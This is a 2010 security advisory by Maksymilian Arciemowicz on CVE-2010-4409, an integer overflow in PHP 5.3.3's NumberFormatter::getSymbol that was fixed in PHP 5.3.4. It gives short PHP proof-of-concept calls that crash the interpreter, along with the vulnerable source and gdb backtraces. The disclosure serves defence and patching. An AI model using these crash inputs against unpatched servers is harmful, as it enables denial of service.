@@ -1,0 +1,200 @@
+From: Maksymilian Arciemowicz <cxib () securityreason com>
+Date: Fri, 10 Dec 2010 14:43:32 +0100
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow ]
+
+Author: Maksymilian Arciemowicz
+http://securityreason.com/
+http://cxib.net/
+Date:
+- - Dis.: 11.11.2010
+- - Pub.: 10.12.2010
+
+CERT: VU#479900
+CVE: CVE-2010-4409
+CWE: CWE-189
+Status: Fixed in PHP 5.3.4
+
+Affected Software:
+- - PHP 5.3.3
+
+Original URL:
+http://securityreason.com/achievement_securityalert/91
+
+
+- --- 0.Description ---
+Internationalization extension (further is referred as Intl) is a
+wrapper for ICU library, enabling PHP programmers to perform
+UCA-conformant collation and date/time/number/currency formatting in
+their scripts.
+
+Number Formatter: allows to display number according to the localized
+format or given pattern or set of rules, and to parse strings into numbers.
+
+
+- --- 1. PoC for Integer Overflow ---
+$nx=new NumberFormatter("pl",1);
+$nx->getSymbol(2147483648);
+
+
+- --- 2. PHP 5.3.3/5.2.14 NumberFormatter::getSymbol Integer Overflow ---
+As we can see in
+
+- ---
+PHP_FUNCTION( numfmt_get_symbol )
+{
+        long symbol;
+        UChar value_buf[4];
+        UChar *value = value_buf;
+        int length = USIZE(value);
+        FORMATTER_METHOD_INIT_VARS;
+
+        /* Parse parameters. */
+        if( zend_parse_method_parameters( ZEND_NUM_ARGS() TSRMLS_CC, getThis(),
+"Ol",
+                &object, NumberFormatter_ce_ptr, &symbol ) == FAILURE )
+        {
+                intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,
+                        "numfmt_get_symbol: unable to parse input params", 0 TSRMLS_CC );
+
+                RETURN_FALSE;
+        }
+
+        /* Fetch the object. */
+        FORMATTER_METHOD_FETCH_OBJECT;
+
+        length = unum_getSymbol(FORMATTER_OBJECT(nfo), symbol, value_buf,
+length, &INTL_DATA_ERROR_CODE(nfo)); <================= !!!TO BIG INT
+HERE!!!
+...
+- ---
+
+will crash for differ value. example {2444492804, 2147483648,
+2147483649, 2554462209} (when rdi out off band (range 2to31 2to32 under
+64bits linux)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned short*,
+int, UErrorCode&) const () from /usr/lib/libicuuc.so.42
+(gdb) bt
+#0  0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned
+short*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42
+#1  0x00007fffee5d11c0 in zif_numfmt_get_symbol (ht=17168120,
+    return_value=0x105c928, return_value_ptr=0x4, this_ptr=0x105f710,
+    return_value_used=17168144)
+    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:269
+...blabla
+
+rip            0x7fffedf317f5   0x7fffedf317f5
+<icu_4_2::UnicodeString::extract(unsigned short*, int, UErrorCode&)
+const+21>
+eflags         0x10206  [ PF IF RF ]
+
+let`s see value ~4294901761
+
+$nx=new NumberFormatter("pl",1);
+$nx->getSymbol(4294901761);
+
+will crash in memcpy(3) ;]
+
+Program received signal SIGSEGV, Segmentation fault.
+memcpy () at ../sysdeps/x86_64/memcpy.S:90
+90      ../sysdeps/x86_64/memcpy.S: No such file or directory.
+        in ../sysdeps/x86_64/memcpy.S
+(gdb) bt
+#0  memcpy () at ../sysdeps/x86_64/memcpy.S:90
+#1  0x00007fffea74a86a in icu_4_2::UnicodeString::extract(unsigned
+short*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42
+#2  0x00007fffeadea2b4 in zif_numfmt_get_symbol (ht=17826952,
+    return_value=0x10fecd0, return_value_ptr=0xc, this_ptr=0x11004a0,
+    return_value_used=17826976)
+    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:274
+#3  0x00000000006e986a in zend_do_fcall_common_helper_SPEC (
+    execute_data=0x7ffff7eb8068)
+    at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316
+...
+
+let's see ICU UnicodeString::extract(unsigned short*, int, UErrorCode&)
+
+- ---
+int32_t
+UnicodeString::extract(UChar *dest, int32_t destCapacity,
+                       UErrorCode &errorCode) const {
+  int32_t len = length();
+  if(U_SUCCESS(errorCode)) {
+    if(isBogus() || destCapacity<0 || (destCapacity>0 && dest==0)) {
+      errorCode=U_ILLEGAL_ARGUMENT_ERROR;
+    } else {
+      const UChar *array = getArrayStart();
+      if(len>0 && len<=destCapacity && array!=dest) {
+        uprv_memcpy(dest, array, len*U_SIZEOF_UCHAR); <======= MEMCPY
+REFERENCE HERE
+      }
+      return u_terminateUChars(dest, destCapacity, len, &errorCode);
+    }
+  }
+
+  return len;
+
+}
+- ---
+
+so crash in rip=memcpy(3).
+
+Method getLocal() also can generate simple crash (CWE-170)
+
+$nx=new IntlDateFormatter("pl", IntlDateFormatter::FULL,
+IntlDateFormatter::FULL);
+$nx->getLocale(1);
+
+
+- --- 3. Fix ---
+Fix in next PHP Version 5.3.4:
+http://www.kb.cert.org/vuls/id/479900
+
+SVN:
+http://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/dateformat/dateformat_attr.c?view=log
+http://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/formatter/formatter_attr.c?view=log
+
+
+- --- 4. Greets ---
+Special thanks for Pierre Joye and Stas Malyshev for very quickly fix
+Michael Orlando for security support
+
+and sp3x, Infospec
+
+
+- --- 5. Contact ---
+Author: SecurityReason.com [ Maksymilian Arciemowicz ]
+
+Email:
+- - cxib {a\./t] securityreason [d=t} com
+
+GPG:
+- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+
+http://securityreason.com/
+http://cxib.net/
+- -- 
+Best Regards
+pub   4096R/D6E5B530 2010-09-19
+uid                  Maksymilian Arciemowicz (cx) <max () cxib net>
+sub   4096R/58BA663C 2010-09-19
+-----BEGIN PGP SIGNATURE-----
+
+iQIcBAEBAgAGBQJNAi5vAAoJEIO8+dzW5bUwsdsP/3/XRI/fXcqRg154DObVa/Ew
+LgVS9ZP5yrTG2JBZnYYSHRB6ZXpK7hEfM838/gVLAolMEnLplynqmiTef74gHBAN
+/VIGpE7sZDsxTeAk+MWzecxS0Gp77kR8ibcd8kClKmdcodgZ+JSJab/3snAclBXT
+CesuN20tUPS4d7sjxTz7K9uZhO+7ezZn6xnJr67l2xcx8xCcrnNNRzapEzQ6tcBj
+cM3pMxond3uAGQT3+ewwl1GQ/30HkX3fjPJPhT6Mna9/LH7f5IGHSnSxw5lJbUjY
+xMaB+qTE44TrKTKqKkkowsPpAeaoQ7a3O16YG6qcWfly+9bf2vQVNhcG+hAa6mgK
+ekNkleDKg+n7Qsgsrl/4mFS/40tCTss9/PQ8/QEp2g4VOSeyzuoVB2PJDl48X4pH
+xabNVh9T3LWkxTnC5wcy2tuF7Tbb1eOngMxBclB9xR6vjr0nqT5EHLy4w+VnXo3I
+FICv2EhojYXpxgrQEteK0JVnZC3ROspAJDM7YC4ZXk4HSRKnFK2Ymf+yyzhycyHu
+cj1F70DTCNvXfdWUuvKVlTQUM4BDGpR1xs23EZqVky+8lk1mRJW98UwCs0kqpN46
+maS8ZXM1+8dEMZFx/2wRcI2xkFoViMuKFpqwvVG+TPYY0fUSUfNdYCoxxl4YiWdD
+u0SjiF38TxqaIjNnvaym
+=3G4F
+-----END PGP SIGNATURE-----
